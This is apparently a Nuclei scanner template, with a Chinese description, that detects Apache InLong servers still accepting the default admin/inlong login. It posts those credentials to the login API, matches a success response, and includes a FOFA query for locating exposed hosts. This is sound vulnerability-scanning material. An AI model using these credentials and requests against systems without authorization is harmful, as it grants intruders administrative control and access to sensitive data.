id: apache-inlong-default-login

info:
  name: Apache InLong 默认口令登录（弱口令）
  author: icarot
  severity: high
  description: |
    该模板通过尝试 Apache InLong 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://github.com/apache/inlong/
  classification:
    cpe: cpe:2.3:a:apache:inlong:1.13.0:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: apache
    product: inlong
    fofa-query: icon_hash="1155196680"
  tags: apache,inlong,default-login,misconfig,vuln

variables:
  username: admin
  password: inlong

http:
  - raw:
      - |
        POST /inlong/manager/api/anno/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":"{{username}}","password":"{{password}}"}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"success":true'
          - '"errMsg":null'
          - '"data":true'
        condition: and

      - type: word
        part: content_type
        words:
          - 'application/json'

      - type: status
        status:
          - 200
